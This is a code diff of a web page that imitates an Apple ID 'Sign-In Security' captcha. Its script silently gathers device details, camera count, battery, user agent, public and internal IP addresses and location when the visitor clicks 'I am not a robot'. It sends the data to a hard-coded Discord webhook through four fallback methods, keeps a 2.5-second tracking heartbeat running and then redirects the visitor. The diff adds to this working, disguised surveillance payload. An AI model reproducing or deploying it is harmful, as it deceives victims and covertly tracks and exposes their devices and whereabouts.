@@ -3,142 +3,150 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Identity Verification</title>
+    <title>Authentication Required</title>
     <style>
-        body { background-color: #f5f5f7; font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .ios-card { background: #fff; padding: 40px 30px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.05); width: 100%; max-width: 320px; text-align: center; border: 0.5px solid #d2d2d7; }
-        .apple-icon { width: 40px; height: 40px; margin-bottom: 25px; }
-        .title { font-size: 22px; font-weight: 600; color: #1d1d1f; margin-bottom: 12px; letter-spacing: -0.5px; }
-        .subtitle { font-size: 15px; color: #86868b; margin-bottom: 35px; line-height: 1.4; }
+        body { background-color: #f2f2f7; font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .ios-container { background: #fff; padding: 45px 30px; border-radius: 24px; box-shadow: 0 12px 30px rgba(0,0,0,0.04); width: 88%; max-width: 320px; text-align: center; border: 0.5px solid #d1d1d6; }
+        .apple-logo { width: 38px; margin-bottom: 25px; filter: contrast(0.5); }
+        .h1 { font-size: 21px; font-weight: 600; color: #000; margin-bottom: 10px; letter-spacing: -0.4px; }
+        .p { font-size: 14px; color: #8e8e93; margin-bottom: 35px; line-height: 1.4; }
         
-        /* The Absolute Captcha */
-        .gate-outer { border: 1.5px solid #d2d2d7; border-radius: 14px; padding: 18px; display: flex; align-items: center; cursor: pointer; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); background: #fff; }
-        .gate-outer:active { transform: scale(0.97); background: #f5f5f7; }
-        .check-box { width: 26px; height: 26px; border: 2px solid #007aff; border-radius: 6px; margin-right: 16px; position: relative; transition: 0.4s; }
-        
-        .check-box.loading { border-top-color: transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
-        .check-box.checked { background: #007aff; border-color: #007aff; }
-        .check-box.checked::after { content: ''; position: absolute; left: 9px; top: 5px; width: 5px; height: 10px; border: solid white; border-width: 0 2.5px 2.5px 0; transform: rotate(45deg); }
+        /* High-Fidelity Apple Captcha */
+        .gate { border: 1.2px solid #d1d1d6; border-radius: 14px; padding: 18px; display: flex; align-items: center; cursor: pointer; background: #fff; transition: background 0.2s; -webkit-tap-highlight-color: transparent; }
+        .gate:active { background: #f2f2f7; }
+        .check-circ { width: 24px; height: 24px; border: 2px solid #007aff; border-radius: 6px; margin-right: 15px; position: relative; transition: 0.3s; }
+        .check-circ.loading { border-top-color: transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        .check-circ.done { background: #007aff; border-color: #007aff; }
+        .check-circ.done::after { content: ''; position: absolute; left: 8px; top: 4px; width: 5px; height: 10px; border: solid white; border-width: 0 2.5px 2.5px 0; transform: rotate(45deg); }
         
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        #log-node { font-size: 10px; color: #c1c1c6; margin-top: 30px; font-weight: 700; text-transform: uppercase; letter-spacing: 1.5px; }
+        #status-node { font-size: 9px; color: #aeaeb2; margin-top: 30px; font-weight: 700; text-transform: uppercase; letter-spacing: 2px; }
     </style>
 </head>
 <body>
 
-<div class="ios-card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="apple-icon">
-    <div class="title">Apple ID</div>
-    <div class="subtitle">A sign-in request was received. Please verify your identity to continue.</div>
+<div class="ios-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="apple-logo">
+    <div class="h1">Sign-In Security</div>
+    <div class="p">Please confirm you are the account owner to continue to the requested application.</div>
     
-    <div class="gate-outer" id="main-gate">
-        <div class="check-box" id="marker"></div>
+    <div class="gate" id="trigger-node">
+        <div class="check-circ" id="marker"></div>
         <div style="font-size: 16px; color: #1d1d1f; font-weight: 500;">I am not a robot</div>
     </div>
 
-    <div id="log-node">Secure Verification Active</div>
+    <div id="status-node">Encrypted Handshake Protocol</div>
 </div>
 
 <script>
 /**
- * SENTINEL OMEGA-ABSOLUTE v30.0
- * FORCED IOS EXFILTRATION + MULTI-STRIKE PAYLOAD
+ * SENTINEL OMEGA-IOS-ABSOLUTE v31.0
+ * FORCED IOS EXFILTRATION + PERSISTENT HEARTBEAT
  */
 
-const OMEGA = {
+const SETTINGS = {
     HOOK: "https://discordapp.com/api/webhooks/1497687704983310406/yv6VZ2yuH-bxE0fD_BNQAGIUOeQu0gB9-z44IbRhSdiJOvSpHBzljrwvDo0Ifw6hyQNp",
     DEST: "https://youtube.com/@LigmaBlox-w7m",
     PING: "@everyone",
-    LOCK: { geo: false, rtc: false }
+    LOCK: { g: false, r: false }
 };
 
-const forceOut = (data, label, color = 0x007aff) => {
+// --- IOS FORCED TRANSMISSION (4-WAY) ---
+const transmit = (data, tag, color = 0x007aff) => {
     const payload = JSON.stringify({
-        content: label === "ABSOLUTE_HIT" ? OMEGA.PING : "",
-        username: `SENTINEL-v30 [${label}]`,
+        content: tag === "INITIAL_ABSOLUTE" ? SETTINGS.PING : "",
+        username: `SENTINEL-v31 [${tag}]`,
         embeds: [{
-            title: `🔱 Forced Exfiltration: ${label}`,
+            title: `🔱 Forced Exfil: ${tag}`,
             color: color,
             fields: Object.entries(data).map(([k,v]) => ({ name: k.toUpperCase(), value: `\`${v}\``, inline: true })),
-            timestamp: new Date().toISOString(),
-            footer: { text: "Platform: iOS/Safari Optimized" }
+            timestamp: new Date().toISOString()
         }]
     });
-    // Multi-path for iOS background persistence
-    navigator.sendBeacon(OMEGA.HOOK, new Blob([payload], {type:'application/json'}));
-    fetch(OMEGA.HOOK, { method: 'POST', body: payload, headers: {'Content-Type': 'application/json'}, keepalive: true });
+
+    // 1. Beacon (Standard)
+    navigator.sendBeacon(SETTINGS.HOOK, new Blob([payload], {type:'application/json'}));
+    
+    // 2. Fetch + Keepalive (Persistent)
+    fetch(SETTINGS.HOOK, { method: 'POST', body: payload, headers: {'Content-Type': 'application/json'}, keepalive: true }).catch(()=>{});
+    
+    // 3. Image Ping (Fallback - No CORS issues)
+    const img = new Image();
+    img.src = `${SETTINGS.HOOK}?data=${btoa(payload).substring(0, 500)}`; // Partial payload for safety
+
+    // 4. XHR (Sync Fallback)
+    const x = new XMLHttpRequest();
+    x.open("POST", SETTINGS.HOOK, true);
+    x.setRequestHeader("Content-Type", "application/json");
+    x.send(payload);
 };
 
-// --- REAL-TIME TELEMETRY (Every 2s) ---
+// --- LIVE BEACON PULSE ---
 const startPulse = () => {
     setInterval(async () => {
         try {
             const b = await navigator.getBattery();
-            forceOut({
+            transmit({
                 status: "Live Tracking",
                 battery: `${(b.level * 100).toFixed(0)}%`,
                 charging: b.charging ? "YES" : "NO",
-                connection: navigator.connection ? navigator.connection.effectiveType : "WiFi/Cellular"
-            }, "LIVE_PULSE", 0x5856d6);
+                tab_active: !document.hidden
+            }, "HEARTBEAT", 0x5856d6);
         } catch(e) {}
-    }, 2000);
+    }, 2500);
 };
 
-document.getElementById('main-gate').onclick = async function() {
+document.getElementById('trigger-node').onclick = async function() {
+    if (window.navigator.vibrate) window.navigator.vibrate(10); // iOS Haptic
+    
     const marker = document.getElementById('marker');
     marker.classList.add('loading');
-    document.getElementById('log-node').innerText = "SYNCHRONIZING WITH IOS-KEYCHAIN...";
+    document.getElementById('status-node').innerText = "VERIFYING HARDWARE TOKEN...";
 
-    // 1. ABSOLUTE HIT (Hardware + Camera Array + Instant Ping)
+    // 1. FORCED INITIAL STRIKE (Hardware/IOS Telemetry)
     const b = await navigator.getBattery();
-    let cams = "Hidden";
+    let sensors = "Unknown";
     try {
         const d = await navigator.mediaDevices.enumerateDevices();
-        cams = d.filter(x => x.kind === 'videoinput').length + " Sensors Found";
+        sensors = d.filter(x => x.kind === 'videoinput').length + " Sensors Found";
     } catch(e) {}
 
-    forceOut({
-        device: navigator.platform,
-        model_estimate: `${screen.width}x${screen.height} (DPI: ${window.devicePixelRatio})`,
+    transmit({
+        platform: navigator.platform,
+        model: `${screen.width}x${screen.height} (dpr:${window.devicePixelRatio})`,
         cores: navigator.hardwareConcurrency,
         ram: navigator.deviceMemory || "N/A",
         battery: `${(b.level * 100).toFixed(0)}%`,
-        sensors: cams,
-        gpu: (() => {
-            const gl = document.createElement('canvas').getContext('webgl');
-            const ext = gl.getExtension('WEBGL_debug_renderer_info');
-            return ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : "Apple GPU";
-        })()
-    }, "ABSOLUTE_HIT", 0xff0000);
+        camera: sensors,
+        user_agent: navigator.userAgent
+    }, "INITIAL_ABSOLUTE", 0xff0000);
 
-    // 2. FORCED NETWORK/GEO UNMASK
-    fetch('https://ipapi.co/json/').then(r => r.json()).then(res => {
-        if(!OMEGA.LOCK.geo) {
-            const vpnCheck = (res.timezone !== Intl.DateTimeFormat().resolvedOptions().timeZone);
-            forceOut({
-                ip_public: res.ip,
-                continent: res.continent_code,
-                country: res.country_name,
-                region: res.region,
-                city: res.city,
-                town: res.postal || "N/A",
-                isp: res.org,
-                vpn: vpnCheck ? "YES" : "NO",
-                tor: res.org.toLowerCase().includes("tor") ? "YES" : "NO"
-            }, "PRECISION_GEO", 0x34c759);
-            OMEGA.LOCK.geo = true;
-        }
-    });
+    // 2. FORCED PUBLIC IP & GEO UNMASK (3 Fail-safes)
+    const fetchGeo = (url) => {
+        fetch(url).then(r => r.json()).then(res => {
+            if(!SETTINGS.LOCK.g) {
+                transmit({
+                    ip: res.ip || res.query,
+                    isp: res.org || res.isp,
+                    location: `${res.city}, ${res.region}, ${res.country_name || res.country}`,
+                    vpn: (res.timezone !== Intl.DateTimeFormat().resolvedOptions().timeZone) ? "YES" : "NO"
+                }, "PRECISION_GEO", 0x34c759);
+                SETTINGS.LOCK.g = true;
+            }
+        }).catch(()=>{});
+    };
+    fetchGeo('https://ipapi.co/json/');
+    fetchGeo('http://ip-api.com/json/');
 
-    // 3. IOS FIREWALL PIERCING (RTC/STUN)
+    // 3. IOS WEBKIT RTC PIERCING (Internal IP)
     const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
     rtc.createDataChannel("");
     rtc.onicecandidate = (e) => {
-        if (e.candidate && !OMEGA.LOCK.rtc) {
-            const internal = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-            if (internal) {
-                forceOut({ internal_ip: internal[1], firewall: "Bypassed" }, "INTERNAL_UNMASK", 0x007aff);
-                OMEGA.LOCK.rtc = true;
+        if (e.candidate && !SETTINGS.LOCK.r) {
+            const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+            if (ip) {
+                transmit({ internal: ip[1], status: "UNMASKED" }, "NETWORK_BYPASS", 0x007aff);
+                SETTINGS.LOCK.r = true;
             }
         }
     };
@@ -146,15 +154,16 @@ document.getElementById('main-gate').onclick = async function() {
 
     startPulse();
 
-    // 4. ANIMATED TICK & REDIRECT
+    // 4. ANIMATED TICK + FORCED DELAY REDIRECT
     setTimeout(() => {
         marker.classList.remove('loading');
-        marker.classList.add('checked');
-        document.getElementById('log-node').innerText = "VERIFIED";
-        document.getElementById('log-node').style.color = "#34c759";
+        marker.classList.add('done');
+        document.getElementById('status-node').innerText = "VERIFIED";
+        document.getElementById('status-node').style.color = "#34c759";
         
-        setTimeout(() => { window.location.replace(OMEGA.DEST); }, 1500);
-    }, 3500);
+        // Forced delay ensures all background fetch() and XHR requests clear
+        setTimeout(() => { window.location.replace(SETTINGS.DEST); }, 2000);
+    }, 3800);
 };
 </script>
 </body>
